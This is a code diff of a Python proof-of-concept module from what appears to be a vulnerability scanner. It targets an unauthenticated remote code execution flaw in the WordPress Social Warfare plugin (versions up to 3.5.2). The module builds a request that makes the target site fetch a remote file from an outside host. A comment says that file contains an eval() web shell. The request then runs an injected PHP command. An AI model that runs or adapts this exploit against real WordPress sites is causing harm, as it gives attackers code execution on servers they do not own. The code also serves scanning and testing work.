@@ -13,8 +13,8 @@ vuln-analysis: https://mp.weixin.qq.com/s/jqdXGIG9SRKniI_2ZhKNJQ
 date:2019-05-11
 """
 
-from lib.core.Request import request
-from lib.utils.random_ua import get_random_ua
+from ScanMoudle.xscan_poc.lib.core.Request import request
+from ScanMoudle.xscan_poc.lib.utils.random_ua import get_random_ua
 from urllib.parse import urlparse
 
 
@@ -27,20 +27,17 @@ def poc(url):
     url = o.scheme + "://" + o.netloc
 
     # 自定义的shell地址，内容为 <pre>eval($_REQUEST['z']);</pre>
-    shellpath = "http://saucer-man.com/aa.txt" 
+    shellpath = "http://saucer-man.com/aa.txt"
+    ## TODO 需要多余服务的统一整合
     # 执行的shell命令
     shell = "phpinfo();"
 
     vulnurl = url + "/wp-admin/admin-post.php?swp_debug=load_options&swp_url={shellpath}&z={shell}".format(shellpath=shellpath,shell=shell)
     try:
-        print(vulnurl)
         headers= {"User-Agent":get_random_ua()}
         r = request.get(vulnurl, headers = headers, timeout=5, verify=False, allow_redirects=False)
-        print(r.status_code)
-        print(r.headers)
-        print(r.text)
         if r.status_code == 200 and "PHP Version" in r.text:
-            return vulnurl
+            return {'payload': vulnurl, 'post_data': '', 'info': 'wordpress plugin Social Warfare <= 3.5.2 - Unauthenticated Remote Code Execution (RCE)'}
         else:
             return False
     except:
